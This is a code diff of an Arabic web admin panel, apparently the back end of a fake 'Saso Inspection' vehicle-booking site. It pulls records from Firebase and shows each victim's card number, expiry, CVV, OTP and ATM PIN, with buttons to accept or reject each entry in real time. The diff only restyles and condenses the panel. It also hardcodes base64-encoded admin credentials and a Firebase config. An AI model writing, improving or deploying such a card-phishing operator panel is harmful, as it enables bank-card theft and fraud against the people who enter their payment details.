@@ -3,98 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - Saso Inspection</title>
+    <title>لوحة التحكم الخفيفة</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
-        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
-        .login-box h2 { color: #1e7344; margin-bottom: 20px; }
-        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
+        #loginOverlay { position: fixed; inset: 0; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
+        .login-box { background: white; padding: 25px; border-radius: 10px; width: 300px; text-align: center; }
+        .login-box input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        .login-box button { width: 100%; padding: 10px; background: #1e7344; color: white; border: none; border-radius: 5px; cursor: pointer; }
         #adminContent { display: none; }
-        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
-        .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; }
-        .container { padding: 15px; }
+        .navbar { background: #1e7344; padding: 10px; display: flex; gap: 5px; position: sticky; top: 0; }
+        .nav-btn { flex: 1; padding: 10px; border: none; background: rgba(255,255,255,0.2); color: white; cursor: pointer; border-radius: 5px; font-size: 14px; }
+        .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
+        .visitor-counter { background: #ffd700; padding: 8px; text-align: center; font-weight: bold; }
+        .container { padding: 10px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
-        .customer-card { background: white; border-radius: 12px; padding: 15px; border-right: 6px solid #1e7344; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
-        .card-data-wrapper { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: nowrap; }
-        .box { padding: 8px 10px; border-radius: 6px; font-size: 13px; background: #f8f9fa; border: 1px solid #eee; text-align: center; }
-        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
-        .status-badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
-        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
-        .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 12px; }
-        .btn-accept { background: #28a745; }
-        .btn-reject { background: #dc3545; }
-        .btn-delete { background: #6c757d; }
-        .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
+        .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .data-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
+        .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 12px; border: 1px solid #ddd; }
+        .btn { padding: 5px 10px; border: none; border-radius: 3px; cursor: pointer; color: white; font-size: 12px; }
+        .btn-del { background: #dc3545; }
+        .btn-ok { background: #28a745; }
+        .logout { background: #000 !important; max-width: 80px; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
 
 <div id="loginOverlay">
     <div class="login-box">
-        <h2>تسجيل الدخول</h2>
-        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
+        <h3>تسجيل الدخول</h3>
+        <input type="text" id="username" placeholder="اسم المستخدم">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button onclick="checkLogin()">دخول</button>
-        <p id="loginError" style="color:red; display:none; margin-top:10px; font-size:14px;">بيانات غير صحيحة!</p>
+        <p id="loginError" style="color:red; display:none;">خطأ في البيانات!</p>
     </div>
 </div>
 
 <div id="adminContent">
-    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">المتواجدون: <span id="onlineCount">0</span></div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
-        <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
+        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">الحجوزات</button>
+        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">البطاقات</button>
+        <button class="nav-btn logout" onclick="logout()">خروج</button>
     </div>
     <div class="container">
         <div id="bookingSection" class="tab-content active">
-            <div id="bookingGrid" class="booking-grid"></div>
+            <div id="bookingList"></div>
         </div>
         <div id="cardsSection" class="tab-content">
-            <div id="paymentsContainer"></div>
+            <div id="paymentsList"></div>
         </div>
     </div>
 </div>
 
 <script>
-    // وظيفة التحقق عند فتح الصفحة لضمان استمرارية الجلسة
     function checkSavedLogin() {
-        const isLogged = localStorage.getItem("admin_logged_in");
-        if (isLogged === "true") {
-            showAdmin();
-        }
+        if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
     }
 
-    // وظيفة تسجيل الدخول مع بيانات مشفرة Base64
     function checkLogin() {
-        const userInput = document.getElementById('username').value.trim().toLowerCase();
-        const passInput = document.getElementById('password').value.trim();
-        const errorMsg = document.getElementById('loginError');
-
-        // الرموز المشفرة (لا يمكن قراءتها بالعين المجردة عند الفحص)
-        // adman -> YWRtYW4=
-        // adman_ -> YWRtYW5f
-        // HH1234567890 -> SEgxMjM0NTY3ODkw
-        
-        const u1 = atob("YWRtYW4="); 
-        const u2 = atob("YWRtYW5f");
-        const p1 = atob("SEgxMjM0NTY3ODkw"); 
-
-        if((userInput === u1 || userInput === u2) && passInput === p1) {
+        const u = document.getElementById('username').value.trim().toLowerCase();
+        const p = document.getElementById('password').value.trim();
+        // التشفير لـ adman و كلمة السر HH1234567890
+        if((u === atob("YWRtYW4=") || u === atob("YWRtYW5f")) && p === atob("SEgxMjM0NTY3ODkw")) {
             localStorage.setItem("admin_logged_in", "true");
             showAdmin();
         } else {
-            errorMsg.style.display = 'block';
+            document.getElementById('loginError').style.display = 'block';
         }
     }
 
@@ -110,7 +87,7 @@
     }
 
     function initFirebase() {
-        const firebaseConfig = {
+        const config = {
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
             authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
@@ -119,88 +96,58 @@
             messagingSenderId: "1009002235896",
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
-        
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
-        const database = firebase.database();
+        if (!firebase.apps.length) firebase.initializeApp(config);
+        const db = firebase.database();
 
-        // تحديث عدد الزوار المتواجدين الآن
-        database.ref('live_visitors').on('value', s => {
-            document.getElementById('onlineCount').innerText = s.numChildren();
-        });
+        db.ref('live_visitors').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());
 
-        // جلب بيانات الحجز
-        database.ref('visitors').on('value', (snapshot) => {
-            const grid = document.getElementById('bookingGrid');
-            grid.innerHTML = '';
-            snapshot.forEach((child) => {
-                const val = child.val();
-                grid.innerHTML += `
-                <div class="customer-card">
-                    <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
-                    <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
-                    <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
-                    <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${child.key}')">حذف</button>
+        db.ref('visitors').on('value', (s) => {
+            let h = '';
+            s.forEach((c) => {
+                const v = c.val();
+                h += `<div class="card">
+                    <b>${v.fullName || 'زائر'}</b><br>
+                    <small>🚗 ${v.vehicleType || '-'} | 🔢 ${v.plateNumber || '-'}</small><br>
+                    <button class="btn btn-del" style="margin-top:5px" onclick="deleteData('visitors/${c.key}')">حذف</button>
                 </div>`;
             });
+            document.getElementById('bookingList').innerHTML = h;
         });
 
-        // جلب بيانات البطاقات والعمليات
-        database.ref('payments').on('value', (snapshot) => {
-            const container = document.getElementById('paymentsContainer');
-            container.innerHTML = '';
-            snapshot.forEach((child) => {
-                const val = child.val();
-                const id = child.key;
-                let statusText = "مستقر";
-                let statusClass = "";
-                if(val.status && val.status.includes('waiting')) {
-                    statusText = "انتظار ⏳";
-                    statusClass = "status-waiting";
-                }
-
-                container.innerHTML += `
-                <div class="operation-row">
-                    <div class="card-data-wrapper">
-                        <div style="min-width:100px;">
-                            <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'}</div>
-                            <span class="status-badge ${statusClass}">${statusText}</span>
-                        </div>
-                        <div style="display:flex; gap:5px; align-items:center; flex-grow:1;">
-                            <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
-                            <div class="box card-box">📅 ${val.expiry || '--/--'}</div>
-                            <div class="box card-box">🔑 ${val.cvv || '---'}</div>
-                            <div class="box" style="background:#e3f2fd; color:#0d47a1;">🔐 OTP: ${val.otp || '-'}</div>
-                            <div class="box" style="background:#f3e5f5; color:#4a148c;">🏧 PIN: ${val.atm_pin || '-'}</div>
-                        </div>
-                        <div style="display:flex; gap:5px;">
-                            <button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">قبول</button>
-                            <button class="btn btn-reject" onclick="updateStatus('${id}', 'reject')">رفض</button>
-                            <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
-                        </div>
+        db.ref('payments').on('value', (s) => {
+            let h = '';
+            s.forEach((c) => {
+                const v = c.val();
+                h += `<div class="card">
+                    <b>${v.cardHolder || 'عميل'}</b> 
+                    <div class="data-row">
+                        <div class="box">${v.cardNumber || '----'}</div>
+                        <div class="box">📅 ${v.expiry || '--/--'}</div>
+                        <div class="box">🔑 ${v.cvv || '---'}</div>
+                        <div class="box" style="color:blue">OTP: ${v.otp || '-'}</div>
+                        <div class="box" style="color:purple">PIN: ${v.atm_pin || '-'}</div>
+                    </div>
+                    <div style="margin-top:10px">
+                        <button class="btn btn-ok" onclick="updateStatus('${c.key}', 'accept')">قبول</button>
+                        <button class="btn btn-del" onclick="updateStatus('${c.key}', 'reject')">رفض</button>
+                        <button class="btn btn-del" style="background:#666" onclick="deleteData('payments/${c.key}')">🗑</button>
                     </div>
                 </div>`;
             });
+            document.getElementById('paymentsList').innerHTML = h;
         });
     }
 
-    function updateStatus(userId, action) {
-        firebase.database().ref('payments/' + userId).update({ status: action });
-    }
+    function updateStatus(id, act) { firebase.database().ref('payments/' + id).update({ status: act }); }
+    function deleteData(p) { if(confirm('متأكد؟')) firebase.database().ref(p).remove(); }
 
-    function deleteData(path) { 
-        if(confirm('هل أنت متأكد؟')) firebase.database().ref(path).remove(); 
-    }
-
-    function openTab(evt, tabName) {
-        var i, tabcontent, navbtns;
-        tabcontent = document.getElementsByClassName("tab-content");
-        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
-        navbtns = document.getElementsByClassName("nav-btn");
-        for (i = 0; i < navbtns.length; i++) navbtns[i].className = navbtns[i].className.replace(" active", "");
-        document.getElementById(tabName).style.display = "block";
-        evt.currentTarget.className += " active";
+    function openTab(evt, name) {
+        let contents = document.getElementsByClassName("tab-content");
+        for (let i = 0; i < contents.length; i++) contents[i].style.display = "none";
+        let btns = document.getElementsByClassName("nav-btn");
+        for (let i = 0; i < btns.length; i++) btns[i].classList.remove("active");
+        document.getElementById(name).style.display = "block";
+        evt.currentTarget.classList.add("active");
     }
 </script>
 </body>
